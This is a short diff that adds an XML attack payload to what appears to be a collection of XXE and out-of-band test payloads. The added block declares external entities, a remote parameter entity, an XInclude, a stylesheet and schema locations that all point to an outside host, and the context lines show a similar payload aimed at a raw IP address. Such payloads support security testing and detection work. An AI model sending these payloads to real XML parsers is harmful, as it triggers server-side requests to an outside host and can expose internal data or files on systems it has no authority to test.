@@ -37,3 +37,22 @@
     http://178.62.247.80/a.xsd">a</y>
 </root>
 ~~~
+
+~~~
+<?xml version="1.0" encoding="utf-8"?>
+<?xml-stylesheet type="text/xml" href="https://berezhasecurity.com/a.xsl"?>
+<!DOCTYPE root PUBLIC "-//A/B/EN" https://berezhasecurity.com/a.dtd [
+  <!ENTITY % remote SYSTEM "https://berezhasecurity.com/a">
+  <!ENTITY xxe SYSTEM "https://berezhasecurity.com/a">
+  %remote;
+]>
+<root>
+  <foo>&xxe;</foo>
+  <x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include
+    href="https://berezhasecurity.com/" ></x>
+  <y xmlns=https://berezhasecurity.com/
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+    xsi:schemaLocation="https://berezhasecurity.com/
+    https://berezhasecurity.com/a.xsd">a</y>
+</root>
+~~~
